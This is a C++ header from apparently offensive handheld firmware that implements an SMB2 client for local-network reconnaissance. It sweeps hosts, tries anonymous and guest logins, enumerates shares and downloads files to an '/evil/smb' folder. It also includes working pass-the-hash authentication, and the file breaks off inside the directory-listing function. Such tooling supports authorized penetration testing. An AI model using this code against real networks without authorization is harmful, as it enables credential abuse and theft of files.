#pragma once
// #define SMB_RPC_DEBUG 1   // uncomment to hexdump NetrShareEnum response over serial
// ============================================================================
//  smb_discover.h  -  Auto SMB discovery + anonymous/guest browser
//
//  Passive recon of SMB shares on the local network:
//    1. ARP sweep the /24, TCP-probe 445 -> hosts running SMB
//    2. SMB2 NEGOTIATE + SESSION_SETUP (NTLMSSP) tried anonymous then guest
//    3. srvsvc NetrShareEnum over IPC$ -> real share list (like smbclient -L)
//    4. QUERY_DIRECTORY -> file explorer, browse the tree
//    5. READ -> download a file to the SD card (/evil/smb/<host>/...)
//
//  SMB2/3 only (dialect 2.0.2 / 2.1). Read-only: no remote write, no exploit.
//  Built on WiFiClient (Direct-TCP transport, port 445). NTLMSSP is sent raw
//  (no SPNEGO wrapper): both Windows and Samba accept it in SESSION_SETUP.
//
//  Use only on networks you own or are authorized to assess.
//  SPDX-License-Identifier: GPL-3.0-or-later
//  Copyright (c) 7h30th3r0n3
// ============================================================================
#include <WiFi.h>
#include <WiFiClient.h>
#include <SD.h>
#include <vector>
#include <string>
#include "mbedtls/md.h"
#include "esp_system.h"

// Host-side helpers (kp, arpRequest, waitAndReturnToMenu, enterDebounce,
// cardUpdate, inMenu, M5 display, SD, key defines) come from the main sketch:
// this header is included late, after all of them are declared.

// ============================ small byte helpers ============================
static inline void smbPut16(std::vector<uint8_t>& b, uint16_t v){ b.push_back(v&0xff); b.push_back((v>>8)&0xff); }
static inline void smbPut32(std::vector<uint8_t>& b, uint32_t v){ for(int i=0;i<4;i++) b.push_back((v>>(8*i))&0xff); }
static inline void smbPut64(std::vector<uint8_t>& b, uint64_t v){ for(int i=0;i<8;i++) b.push_back((v>>(8*i))&0xff); }
static inline uint16_t smbGet16(const uint8_t* p){ return (uint16_t)p[0] | ((uint16_t)p[1]<<8); }
static inline uint32_t smbGet32(const uint8_t* p){ return (uint32_t)p[0]|((uint32_t)p[1]<<8)|((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24); }
static inline uint64_t smbGet64(const uint8_t* p){ uint64_t v=0; for(int i=0;i<8;i++) v|=((uint64_t)p[i])<<(8*i); return v; }

// ASCII -> UTF16LE
static void smbAsciiToU16(const char* s, std::vector<uint8_t>& out){
    for(; *s; ++s){ out.push_back((uint8_t)*s); out.push_back(0); }
}
// UTF16LE -> ASCII (drop high byte); len is byte length
static String smbU16ToAscii(const uint8_t* p, int lenBytes){
    String s; for(int i=0;i+1<lenBytes;i+=2){ uint8_t c=p[i]; s += (c>=32&&c<127)? (char)c : (p[i+1]? '?' : (char)c); } return s;
}

// ============================ MD4 (for NTLMv2) =============================
// Compact RFC1320 implementation (needed for the NT hash; mbedtls MD4 is
// often compiled out). Only used for the optional guest NTLMv2 path.
static void smbMD4(const uint8_t* msg, size_t len, uint8_t out[16]){
    auto mF=[](uint32_t x,uint32_t y,uint32_t z){return (x&y)|(~x&z);};
    auto mG=[](uint32_t x,uint32_t y,uint32_t z){return (x&y)|(x&z)|(y&z);};
    auto mH=[](uint32_t x,uint32_t y,uint32_t z){return x^y^z;};
    auto ROL=[](uint32_t x,int n){return (x<<n)|(x>>(32-n));};
    uint32_t a0=0x67452301,b0=0xefcdab89,c0=0x98badcfe,d0=0x10325476;
    size_t newLen=((len+8)/64+1)*64;
    std::vector<uint8_t> m(newLen,0); memcpy(m.data(),msg,len); m[len]=0x80;
    uint64_t bits=(uint64_t)len*8; for(int i=0;i<8;i++) m[newLen-8+i]=(bits>>(8*i))&0xff;
    for(size_t off=0; off<newLen; off+=64){
        uint32_t X[16]; for(int i=0;i<16;i++) X[i]=smbGet32(&m[off+i*4]);
        uint32_t A=a0,B=b0,C=c0,D=d0;
        const int s1[4]={3,7,11,19};
        for(int i=0;i<16;i++){int k=i; int s=s1[i%4];
            if(i%4==0)A=ROL(A+mF(B,C,D)+X[k],s);else if(i%4==1)D=ROL(D+mF(A,B,C)+X[k],s);
            else if(i%4==2)C=ROL(C+mF(D,A,B)+X[k],s);else B=ROL(B+mF(C,D,A)+X[k],s);}
        const int o2[16]={0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15}; const int s2[4]={3,5,9,13};
        for(int i=0;i<16;i++){int k=o2[i]; int s=s2[i%4];
            if(i%4==0)A=ROL(A+mG(B,C,D)+X[k]+0x5a827999,s);else if(i%4==1)D=ROL(D+mG(A,B,C)+X[k]+0x5a827999,s);
            else if(i%4==2)C=ROL(C+mG(D,A,B)+X[k]+0x5a827999,s);else B=ROL(B+mG(C,D,A)+X[k]+0x5a827999,s);}
        const int o3[16]={0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15}; const int s3[4]={3,9,11,15};
        for(int i=0;i<16;i++){int k=o3[i]; int s=s3[i%4];
            if(i%4==0)A=ROL(A+mH(B,C,D)+X[k]+0x6ed9eba1,s);else if(i%4==1)D=ROL(D+mH(A,B,C)+X[k]+0x6ed9eba1,s);
            else if(i%4==2)C=ROL(C+mH(D,A,B)+X[k]+0x6ed9eba1,s);else B=ROL(B+mH(C,D,A)+X[k]+0x6ed9eba1,s);}
        a0+=A;b0+=B;c0+=C;d0+=D;
    }
    uint32_t v[4]={a0,b0,c0,d0}; for(int i=0;i<4;i++) for(int j=0;j<4;j++) out[i*4+j]=(v[i]>>(8*j))&0xff;
}
static void smbHmacMd5(const uint8_t* key,size_t klen,const uint8_t* data,size_t dlen,uint8_t out[16]){
    const mbedtls_md_info_t* info=mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
    mbedtls_md_hmac(info,key,klen,data,dlen,out);
}
static void smbHmacSha256(const uint8_t* key,size_t klen,const uint8_t* data,size_t dlen,uint8_t out[32]){
    const mbedtls_md_info_t* info=mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
    mbedtls_md_hmac(info,key,klen,data,dlen,out);
}

// ============================= SMB2 constants ==============================
#define SMB2_NEGOTIATE      0x0000
#define SMB2_SESSION_SETUP  0x0001
#define SMB2_LOGOFF         0x0002
#define SMB2_TREE_CONNECT   0x0003
#define SMB2_TREE_DISCONNECT 0x0004
#define SMB2_CREATE         0x0005
#define SMB2_CLOSE          0x0006
#define SMB2_READ           0x0008
#define SMB2_WRITE          0x0009
#define SMB2_QUERY_DIRECTORY 0x000E
#define NT_SUCCESS          0x00000000
#define NT_MORE_PROCESSING  0xC0000016
#define NT_NO_MORE_FILES    0x80000006
#define NT_PENDING          0x00000103

struct SmbEntry { String name; bool isDir; uint64_t size; };

class Smb2 {
public:
    WiFiClient cli;
    uint64_t sessionId=0, msgId=0;
    uint32_t treeId=0;
    IPAddress host;
    String lastError;
    uint32_t lastStatus=0;      // NTSTATUS of the last response (for friendly messages)
    bool authMode_guest=false;  // true if guest path used
    String authUser;            // user label if a credentialed login succeeded ("" otherwise)
    // recon: server identity pulled from the NTLMSSP Type2 target info
    String targetName, targetDomain;
    // SMB2 message signing (HMAC-SHA256, 2.x). Armed only when the server
    // *requires* it and we hold a session key, so unsigned servers are untouched.
    bool    signingRequired=false;   // from NEGOTIATE SecurityMode
    bool    signActive=false;        // currently signing outgoing messages
    bool    haveSessionKey=false;
    uint8_t sessionKey[16];          // NTLMv2 ExportedSessionKey (== 2.x signing key)
    uint64_t lastMsgId=0;            // MessageId used by the most recent send()

    bool connect(IPAddress ip, uint16_t port=445, uint32_t toMs=4000){
        host=ip; cli.setTimeout(6);
        uint32_t t0=millis();
        if(!cli.connect(ip,port)){ lastError="tcp connect fail"; return false; }
        (void)toMs; (void)t0; return true;
    }
    void close(){ if(cli.connected()) cli.stop(); sessionId=0; treeId=0; }

    // ---- transport: 4-byte Direct-TCP prefix + SMB2 message ----
    bool send(uint16_t cmd, const std::vector<uint8_t>& body, uint16_t creditReq=1, uint16_t creditCharge=0){
        std::vector<uint8_t> h; h.reserve(64+body.size());
        uint8_t id[4]={0xFE,'S','M','B'}; for(int i=0;i<4;i++) h.push_back(id[i]);
        smbPut16(h,64); smbPut16(h,creditCharge); // StructureSize, CreditCharge
        smbPut32(h,0);                           // Status/ChannelSeq
        smbPut16(h,cmd); smbPut16(h,creditReq);  // Command, CreditRequest
        smbPut32(h, signActive ? 0x00000008u : 0u);  // Flags (SMB2_FLAGS_SIGNED)
        smbPut32(h,0);                           // NextCommand
        lastMsgId=msgId; smbPut64(h,msgId++);    // MessageId
        smbPut32(h,0);                           // Reserved
        smbPut32(h,treeId);                      // TreeId
        smbPut64(h,sessionId);                   // SessionId
        for(int i=0;i<16;i++) h.push_back(0);    // Signature (zeroed while computing the MAC)
        for(size_t i=0;i<body.size();i++) h.push_back(body[i]);
        if(signActive && haveSessionKey){        // SMB 2.x: HMAC-SHA256 over the whole PDU, first 16 bytes
            uint8_t mac[32]; smbHmacSha256(sessionKey,16,h.data(),h.size(),mac);
            for(int i=0;i<16;i++) h[48+i]=mac[i];
        }
        uint8_t pre[4]={0,(uint8_t)((h.size()>>16)&0xff),(uint8_t)((h.size()>>8)&0xff),(uint8_t)(h.size()&0xff)};
        if(cli.write(pre,4)!=4) return false;
        size_t off=0; while(off<h.size()){ int w=cli.write(h.data()+off,h.size()-off); if(w<=0) return false; off+=w; }
        return true;
    }
    // reads one response into rx; returns NTSTATUS, or 0xFFFFFFFF on IO error
    uint32_t recv(std::vector<uint8_t>& rx, uint32_t toMs=6000){
        uint8_t pre[4]; if(!readN(pre,4,toMs)) return 0xFFFFFFFF;
        uint32_t len=((uint32_t)pre[1]<<16)|((uint32_t)pre[2]<<8)|pre[3];
        if(len<64||len>262144){ return 0xFFFFFFFF; }
        // guard against heap fragmentation: a failed contiguous alloc must not abort()
        try { rx.assign(len,0); } catch(...) { lastError="recv oom "+String(len); return 0xFFFFFFFF; }
        if(!readN(rx.data(),len,toMs)) return 0xFFFFFFFF;
        if(rx[0]!=0xFE) return 0xFFFFFFFF;
        lastStatus=smbGet32(&rx[8]); return lastStatus;
    }
    bool readN(uint8_t* buf,size_t n,uint32_t toMs){
        size_t got=0; uint32_t t0=millis();
        while(got<n){
            if(!cli.connected()&&cli.available()==0) return false;
            int a=cli.available();
            if(a>0){ int r=cli.read(buf+got,n-got); if(r>0){got+=r; t0=millis();} }
            else { if(millis()-t0>toMs) return false; delay(2); }
        }
        return true;
    }

    // ------------------------------ NEGOTIATE ------------------------------
    uint16_t dialect=0;   // dialect the server selected
    bool negotiate(){
        std::vector<uint8_t> b;
        smbPut16(b,36); smbPut16(b,2); smbPut16(b,1); smbPut16(b,0); // size,dialectcount=2,signing enabled,reserved
        smbPut32(b,0);                                               // capabilities
        uint8_t guid[16]; esp_fill_random(guid,16); for(int i=0;i<16;i++) b.push_back(guid[i]);
        smbPut64(b,0);                                               // ClientStartTime
        // Offer only SMB 2.0.2 / 2.1 so signing is always HMAC-SHA256 (correct and
        // testable). 3.x would need AES-CMAC + the SP800-108 KDF; we trade SMB3
        // (which we never encrypted anyway) for guaranteed signing against
        // signing-required Windows/Samba targets.
        smbPut16(b,0x0202); smbPut16(b,0x0210);
        if(!send(SMB2_NEGOTIATE,b)){ lastError="neg send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx);
        if(st!=NT_SUCCESS){ lastError="neg status "+String(st,HEX); return false; }
        if(rx.size()>=64+6) dialect=smbGet16(&rx[64+4]);             // DialectRevision
        if(rx.size()>=64+4){ uint16_t secMode=smbGet16(&rx[64+2]);   // SecurityMode
            signingRequired=(secMode & 0x0002)!=0; }                 // SIGNING_REQUIRED
        return true;
    }

    // --------------------------- NTLMSSP tokens ----------------------------
    void ntlmType1(std::vector<uint8_t>& t){
        const char* sig="NTLMSSP"; for(int i=0;i<7;i++) t.push_back(sig[i]); t.push_back(0);
        smbPut32(t,1);                         // type 1
        smbPut32(t,0x00088207);                // flags: UNICODE|OEM|REQ_TARGET|NTLM|ALWAYS_SIGN|EXT_SEC
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,0);  // domain (empty)
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,0);  // workstation (empty)
    }
    // echo the server's MsvAvTimestamp (AV_PAIR id 7) from the target info, so
    // hardened servers accept the NTLMv2 blob; 0 if the server sent none.
    uint64_t ntlmTimestamp(const std::vector<uint8_t>& ti){
        size_t i=0;
        while(i+4<=ti.size()){
            uint16_t id=ti[i]|(ti[i+1]<<8); uint16_t len=ti[i+2]|(ti[i+3]<<8); i+=4;
            if(id==0) break;                       // MsvAvEOL
            if(id==7 && len>=8 && i+8<=ti.size()){ uint64_t t=0; for(int k=0;k<8;k++) t|=((uint64_t)ti[i+k])<<(8*k); return t; }
            i+=len;
        }
        return 0;
    }
    // read one AV_PAIR string by id (1=NB host,2=NB domain,3=DNS host,4=DNS domain)
    String ntlmAvString(const std::vector<uint8_t>& ti, uint16_t wantId){
        size_t i=0;
        while(i+4<=ti.size()){
            uint16_t id=ti[i]|(ti[i+1]<<8); uint16_t len=ti[i+2]|(ti[i+3]<<8); i+=4;
            if(id==0) break;
            if(id==wantId && i+len<=ti.size()) return smbU16ToAscii(&ti[i],len);
            i+=len;
        }
        return "";
    }
    // set targetName/targetDomain from the server's Type2 target info (DNS pref.)
    void parseTargetInfo(const std::vector<uint8_t>& ti){
        String dh=ntlmAvString(ti,3), nh=ntlmAvString(ti,1);
        String dd=ntlmAvString(ti,4), nd=ntlmAvString(ti,2);
        targetName   = dh.length()? dh : nh;
        targetDomain = dd.length()? dd : nd;
    }
    // extract server challenge(8) + target info from a Type2 token
    bool ntlmType2(const uint8_t* p,int len,uint8_t challenge[8],std::vector<uint8_t>& targetInfo){
        if(len<48) return false;
        memcpy(challenge,p+24,8);
        uint16_t tiLen=smbGet16(p+40); uint32_t tiOff=smbGet32(p+44);
        if(tiOff+tiLen<= (uint32_t)len){ targetInfo.assign(p+tiOff,p+tiOff+tiLen); }
        return true;
    }
    // anonymous Type3
    void ntlmType3Anon(std::vector<uint8_t>& t){
        const char* sig="NTLMSSP"; for(int i=0;i<7;i++) t.push_back(sig[i]); t.push_back(0);
        smbPut32(t,3);
        uint32_t payload=64; // fixed part length
        // Lm: 1 zero byte ; Nt: empty ; Domain/User/Ws: empty ; SessionKey: empty
        smbPut16(t,1); smbPut16(t,1); smbPut32(t,payload);      // Lm (Z(1))
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,payload+1);    // Nt
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,payload+1);    // Domain
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,payload+1);    // User
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,payload+1);    // Workstation
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,payload+1);    // SessionKey
        smbPut32(t,0x00088207|0x00000800);                      // flags + ANONYMOUS
        t.push_back(0);                                         // Lm payload (1 zero)
    }
    // guest Type3 (NTLMv2, empty password)
    void ntlmType3Guest(const uint8_t challenge[8],std::vector<uint8_t>& targetInfo,std::vector<uint8_t>& t){
        // NTOWFv2 = HMAC_MD5(MD4(unicode("")), unicode(UPPER("GUEST")) + unicode(""))
        uint8_t nthash[16]; smbMD4((const uint8_t*)"",0,nthash);
        std::vector<uint8_t> up; smbAsciiToU16("GUEST",up);
        uint8_t respKey[16]; smbHmacMd5(nthash,16,up.data(),up.size(),respKey);
        // temp blob
        std::vector<uint8_t> temp; temp.push_back(1);temp.push_back(1);for(int i=0;i<6;i++)temp.push_back(0);
        smbPut64(temp, ntlmTimestamp(targetInfo));  // echo server timestamp (0 if none)
        uint8_t cc[8]; esp_fill_random(cc,8); for(int i=0;i<8;i++) temp.push_back(cc[i]);
        smbPut32(temp,0); for(size_t i=0;i<targetInfo.size();i++) temp.push_back(targetInfo[i]); smbPut32(temp,0);
        // NTProofStr = HMAC_MD5(respKey, challenge + temp)
        std::vector<uint8_t> in; for(int i=0;i<8;i++) in.push_back(challenge[i]); for(auto c:temp) in.push_back(c);
        uint8_t proof[16]; smbHmacMd5(respKey,16,in.data(),in.size(),proof);
        smbHmacMd5(respKey,16,proof,16,sessionKey); haveSessionKey=true;  // ExportedSessionKey
        std::vector<uint8_t> ntResp; for(int i=0;i<16;i++) ntResp.push_back(proof[i]); for(auto c:temp) ntResp.push_back(c);
        // Lmv2 = HMAC_MD5(respKey, challenge+cc) + cc
        std::vector<uint8_t> lin; for(int i=0;i<8;i++) lin.push_back(challenge[i]); for(int i=0;i<8;i++) lin.push_back(cc[i]);
        uint8_t lm[16]; smbHmacMd5(respKey,16,lin.data(),lin.size(),lm);
        std::vector<uint8_t> lmResp; for(int i=0;i<16;i++) lmResp.push_back(lm[i]); for(int i=0;i<8;i++) lmResp.push_back(cc[i]);
        std::vector<uint8_t> userU; smbAsciiToU16("guest",userU);
        // assemble
        const char* sig="NTLMSSP"; for(int i=0;i<7;i++) t.push_back(sig[i]); t.push_back(0); smbPut32(t,3);
        uint32_t off=64;
        uint32_t lmOff=off; off+=lmResp.size();
        uint32_t ntOff=off; off+=ntResp.size();
        uint32_t domOff=off; // empty
        uint32_t usrOff=off; off+=userU.size();
        uint32_t wsOff=off;
        uint32_t skOff=off;
        smbPut16(t,lmResp.size()); smbPut16(t,lmResp.size()); smbPut32(t,lmOff);
        smbPut16(t,ntResp.size()); smbPut16(t,ntResp.size()); smbPut32(t,ntOff);
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,domOff);
        smbPut16(t,userU.size()); smbPut16(t,userU.size()); smbPut32(t,usrOff);
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,wsOff);
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,skOff);
        smbPut32(t,0x00088207);
        for(auto c:lmResp) t.push_back(c);
        for(auto c:ntResp) t.push_back(c);
        for(auto c:userU) t.push_back(c);
    }
    // credentialed Type3 (NTLMv2 with a real user/password/domain)
    void ntlmType3User(const String& user,const String& pass,const String& domain,
                       const uint8_t challenge[8],std::vector<uint8_t>& targetInfo,std::vector<uint8_t>& t){
        std::vector<uint8_t> pwU; smbAsciiToU16(pass.c_str(),pwU);
        uint8_t nthash[16]; smbMD4(pwU.data(),pwU.size(),nthash);
        ntlmType3WithHash(user,nthash,domain,challenge,targetInfo,t);
    }
    // same, but given the NT hash directly (pass-the-hash). nthash = MD4(UTF16(pass)).
    void ntlmType3WithHash(const String& user,const uint8_t nthash[16],const String& domain,
                       const uint8_t challenge[8],std::vector<uint8_t>& targetInfo,std::vector<uint8_t>& t){
        // NTOWFv2 = HMAC_MD5(nthash, unicode(UPPER(user)) + unicode(domain))
        String uu=user; uu.toUpperCase();
        std::vector<uint8_t> idU; smbAsciiToU16(uu.c_str(),idU);
        { std::vector<uint8_t> dU; smbAsciiToU16(domain.c_str(),dU); for(auto c:dU) idU.push_back(c); }
        uint8_t respKey[16]; smbHmacMd5(nthash,16,idU.data(),idU.size(),respKey);
        // temp blob
        std::vector<uint8_t> temp; temp.push_back(1);temp.push_back(1);for(int i=0;i<6;i++)temp.push_back(0);
        smbPut64(temp, ntlmTimestamp(targetInfo));  // echo server timestamp (0 if none)
        uint8_t cc[8]; esp_fill_random(cc,8); for(int i=0;i<8;i++) temp.push_back(cc[i]);
        smbPut32(temp,0); for(size_t i=0;i<targetInfo.size();i++) temp.push_back(targetInfo[i]); smbPut32(temp,0);
        // NTProofStr = HMAC_MD5(respKey, challenge + temp)
        std::vector<uint8_t> in; for(int i=0;i<8;i++) in.push_back(challenge[i]); for(auto c:temp) in.push_back(c);
        uint8_t proof[16]; smbHmacMd5(respKey,16,in.data(),in.size(),proof);
        // ExportedSessionKey = HMAC_MD5(respKey, NTProofStr)  -> SMB 2.x signing key
        smbHmacMd5(respKey,16,proof,16,sessionKey); haveSessionKey=true;
        std::vector<uint8_t> ntResp; for(int i=0;i<16;i++) ntResp.push_back(proof[i]); for(auto c:temp) ntResp.push_back(c);
        // Lmv2 = HMAC_MD5(respKey, challenge+cc) + cc
        std::vector<uint8_t> lin; for(int i=0;i<8;i++) lin.push_back(challenge[i]); for(int i=0;i<8;i++) lin.push_back(cc[i]);
        uint8_t lm[16]; smbHmacMd5(respKey,16,lin.data(),lin.size(),lm);
        std::vector<uint8_t> lmResp; for(int i=0;i<16;i++) lmResp.push_back(lm[i]); for(int i=0;i<8;i++) lmResp.push_back(cc[i]);
        std::vector<uint8_t> userU; smbAsciiToU16(user.c_str(),userU);
        std::vector<uint8_t> domU;  smbAsciiToU16(domain.c_str(),domU);
        // assemble
        const char* sig="NTLMSSP"; for(int i=0;i<7;i++) t.push_back(sig[i]); t.push_back(0); smbPut32(t,3);
        uint32_t off=64;
        uint32_t lmOff=off; off+=lmResp.size();
        uint32_t ntOff=off; off+=ntResp.size();
        uint32_t domOff=off; off+=domU.size();
        uint32_t usrOff=off; off+=userU.size();
        uint32_t wsOff=off;
        uint32_t skOff=off;
        smbPut16(t,lmResp.size()); smbPut16(t,lmResp.size()); smbPut32(t,lmOff);
        smbPut16(t,ntResp.size()); smbPut16(t,ntResp.size()); smbPut32(t,ntOff);
        smbPut16(t,domU.size());   smbPut16(t,domU.size());   smbPut32(t,domOff);
        smbPut16(t,userU.size());  smbPut16(t,userU.size());  smbPut32(t,usrOff);
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,wsOff);
        smbPut16(t,0); smbPut16(t,0); smbPut32(t,skOff);
        smbPut32(t,0x00088207);
        for(auto c:lmResp) t.push_back(c);
        for(auto c:ntResp) t.push_back(c);
        for(auto c:domU)   t.push_back(c);
        for(auto c:userU)  t.push_back(c);
    }

    bool sessionSetupWith(const std::vector<uint8_t>& token1, bool guest, const uint8_t* ch, std::vector<uint8_t>* ti){
        signActive=false; haveSessionKey=false;
        // Round 1: Type1
        auto buildSS=[&](const std::vector<uint8_t>& sec){
            std::vector<uint8_t> b; smbPut16(b,25); b.push_back(0); b.push_back(1); // size,flags,secmode
            smbPut32(b,0); smbPut32(b,0);           // caps, channel
            smbPut16(b,0x58); smbPut16(b,sec.size());// secbuf offset(88), len
            smbPut64(b,0);                           // prev session
            for(auto c:sec) b.push_back(c);
            return b;
        };
        if(!send(SMB2_SESSION_SETUP,buildSS(token1))){ lastError="ss1 send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx);
        if(st!=NT_MORE_PROCESSING){ lastError="ss1 status "+String(st,HEX); return false; }
        sessionId=smbGet64(&rx[40]);
        // parse Type2 security buffer
        uint16_t sbOff=smbGet16(&rx[64+4]); uint16_t sbLen=smbGet16(&rx[64+6]);
        if((uint32_t)sbOff+sbLen>rx.size()){ lastError="ss1 secbuf"; return false; }
        uint8_t challenge[8]; std::vector<uint8_t> targetInfo;
        ntlmType2(&rx[sbOff],sbLen,challenge,targetInfo);
        parseTargetInfo(targetInfo);
        // Round 2: Type3
        std::vector<uint8_t> t3;
        if(guest) ntlmType3Guest(challenge,targetInfo,t3); else ntlmType3Anon(t3);
        if(signingRequired && haveSessionKey) signActive=true;   // sign from the Type3 on
        if(!send(SMB2_SESSION_SETUP,buildSS(t3))){ lastError="ss2 send"; return false; }
        std::vector<uint8_t> rx2; uint32_t st2=recv(rx2);
        if(st2!=NT_SUCCESS){ signActive=false; lastError="ss2 status "+String(st2,HEX); return false; }
        return true;
    }
    // try anonymous, then guest; returns true on either
    bool authenticate(){
        std::vector<uint8_t> t1; ntlmType1(t1);
        if(sessionSetupWith(t1,false,nullptr,nullptr)){ authMode_guest=false; return true; }
        // reset session and retry as guest
        sessionId=0;
        std::vector<uint8_t> t1b; ntlmType1(t1b);
        if(sessionSetupWith(t1b,true,nullptr,nullptr)){ authMode_guest=true; return true; }
        return false;
    }
    // force the guest (NTLMv2 empty password) path only
    bool authenticateGuestOnly(){
        sessionId=0;
        std::vector<uint8_t> t1; ntlmType1(t1);
        if(sessionSetupWith(t1,true,nullptr,nullptr)){ authMode_guest=true; return true; }
        return false;
    }
    // establish a NEW session authenticated with a real user/password (NTLMv2).
    // user may be "DOMAIN\\name" or "name"; replaces the current identity.
    bool authenticateUser(const String& userIn, const String& pass){
        return loginNtlm(userIn, pass, nullptr);
    }
    // pass-the-hash: authenticate with the NT hash (32 hex) instead of a password.
    bool authenticateHash(const String& userIn, const String& ntHashHex){
        String h=ntHashHex; h.trim();
        if(h.length()!=32){ lastError="NT hash must be 32 hex"; return false; }
        uint8_t nth[16];
        for(int i=0;i<16;i++){
            auto hx=[&](char c)->int{ if(c>='0'&&c<='9')return c-'0'; c|=0x20; if(c>='a'&&c<='f')return c-'a'+10; return -1; };
            int hi=hx(h[i*2]), lo=hx(h[i*2+1]); if(hi<0||lo<0){ lastError="NT hash not hex"; return false; }
            nth[i]=(uint8_t)((hi<<4)|lo);
        }
        return loginNtlm(userIn, "", nth);
    }
    // shared NTLMv2 login. nthash!=nullptr => pass-the-hash; else derive from pass.
    bool loginNtlm(const String& userIn, const String& pass, const uint8_t* nthash){
        String user=userIn, domain="";
        int bs=user.indexOf('\\'); if(bs>=0){ domain=user.substring(0,bs); user=user.substring(bs+1); }
        sessionId=0; signActive=false; haveSessionKey=false;
        std::vector<uint8_t> t1; ntlmType1(t1);
        auto buildSS=[&](const std::vector<uint8_t>& sec){
            std::vector<uint8_t> b; smbPut16(b,25); b.push_back(0); b.push_back(1);
            smbPut32(b,0); smbPut32(b,0); smbPut16(b,0x58); smbPut16(b,sec.size());
            smbPut64(b,0); for(auto c:sec) b.push_back(c); return b;
        };
        if(!send(SMB2_SESSION_SETUP,buildSS(t1))){ lastError="login ss1 send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx);
        if(st!=NT_MORE_PROCESSING){ lastError="login ss1 st "+String(st,HEX); return false; }
        sessionId=smbGet64(&rx[40]);
        uint16_t sbOff=smbGet16(&rx[64+4]); uint16_t sbLen=smbGet16(&rx[64+6]);
        if((uint32_t)sbOff+sbLen>rx.size()){ lastError="login secbuf"; return false; }
        uint8_t challenge[8]; std::vector<uint8_t> targetInfo;
        ntlmType2(&rx[sbOff],sbLen,challenge,targetInfo);
        parseTargetInfo(targetInfo);
        // round 2: Type3 with credentials (password or NT hash)
        std::vector<uint8_t> t3;
        if(nthash) ntlmType3WithHash(user,nthash,domain,challenge,targetInfo,t3);
        else       ntlmType3User(user,pass,domain,challenge,targetInfo,t3);
        if(signingRequired && haveSessionKey) signActive=true;
        if(!send(SMB2_SESSION_SETUP,buildSS(t3))){ lastError="login ss2 send"; return false; }
        std::vector<uint8_t> rx2; uint32_t st2=recv(rx2);
        if(st2!=NT_SUCCESS){ signActive=false; lastError="login ss2 st "+String(st2,HEX); return false; }
        // SESSION_FLAG_IS_GUEST (0x1) in the response means the server fell back to guest
        uint16_t sflags=smbGet16(&rx2[64+2]);
        if(sflags & 0x1){ signActive=false; lastError="server granted guest, not "+userIn; return false; }
        authMode_guest=false; authUser=userIn; return true;
    }

    // --------------------------- TREE CONNECT ------------------------------
    bool treeConnect(const String& share){ // share = "IPC$" or a share name
        String path="\\\\"+host.toString()+"\\"+share;
        std::vector<uint8_t> u; smbAsciiToU16(path.c_str(),u);
        std::vector<uint8_t> b; smbPut16(b,9); smbPut16(b,0);   // size, reserved/flags
        smbPut16(b,0x48); smbPut16(b,u.size());                 // path offset(72), len
        for(auto c:u) b.push_back(c);
        treeId=0;
        if(!send(SMB2_TREE_CONNECT,b)){ lastError="tc send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx);
        if(st!=NT_SUCCESS){ lastError="tc status "+String(st,HEX); return false; }
        treeId=smbGet32(&rx[36]);
        return true;
    }
    void treeDisconnect(){ std::vector<uint8_t> b; smbPut16(b,4); smbPut16(b,0); send(SMB2_TREE_DISCONNECT,b); std::vector<uint8_t> rx; recv(rx); treeId=0; }

    // ------------------------------- CREATE --------------------------------
    // opens path (dir or file or pipe); returns fileId(16) + size via out
    bool create(const String& name, bool wantDir, uint8_t fileId[16], uint64_t* sizeOut=nullptr, uint32_t accessOverride=0){
        std::vector<uint8_t> u; smbAsciiToU16(name.c_str(),u);
        std::vector<uint8_t> b; smbPut16(b,57); b.push_back(0); b.push_back(0); // size,secflags,oplock
        smbPut32(b,2);                         // impersonation = Impersonation
        smbPut64(b,0); smbPut64(b,0);          // SmbCreateFlags, Reserved
        uint32_t access = accessOverride ? accessOverride : (wantDir ? 0x00100081 : 0x00120089); // list-dir : read-file
        smbPut32(b,access);
        smbPut32(b,0);                         // FileAttributes
        smbPut32(b,7);                         // ShareAccess R|W|D
        smbPut32(b,1);                         // CreateDisposition = FILE_OPEN
        smbPut32(b, wantDir?0x01:0x40);        // CreateOptions dir:nondir
        smbPut16(b,0x78);                      // NameOffset = 120
        smbPut16(b,u.size());                  // NameLength
        smbPut32(b,0); smbPut32(b,0);          // CreateContexts off/len
        for(auto c:u) b.push_back(c);
        if(u.empty()) b.push_back(0);          // ensure non-empty body alignment
        if(!send(SMB2_CREATE,b)){ lastError="create send"; return false; }
        std::vector<uint8_t> rx; uint32_t st=recv(rx);
        if(st!=NT_SUCCESS){ lastError="create "+name+" st "+String(st,HEX); return false; }
        if(rx.size()<64+80){ lastError="create resp short"; return false; }
        memcpy(fileId,&rx[64+64],16);   // SMB2 CREATE resp: FileId at body offset 64 (MS-SMB2 2.2.14)
        if(sizeOut) *sizeOut=smbGet64(&rx[64+48]);  // EndOfFile at body offset 48
        return true;
    }
    void closeFid(const uint8_t fileId[16]){
        std::vector<uint8_t> b; smbPut16(b,24); smbPut16(b,0); smbPut32(b,0);
        for(int i=0;i<16;i++) b.push_back(fileId[i]);
        send(SMB2_CLOSE,b); std::vector<uint8_t> rx; recv(rx);
    }

    // --------------------------- QUERY_DIRECTORY ---------------------------
    // cap entries per directory so a huge dir (e.g. a credential dump with
    // hundreds of thousands of files) can't exhaust the ~140K heap and abort().
    static const size_t LISTDIR_MAX=1000;
    bool listDir(const String& path, std::vector<SmbEntry>& out){
        uint8_t fid[16];
        if(!create(path,true,fid,nullptr)) return false;
        bool first=true, ok=true, capped=false;
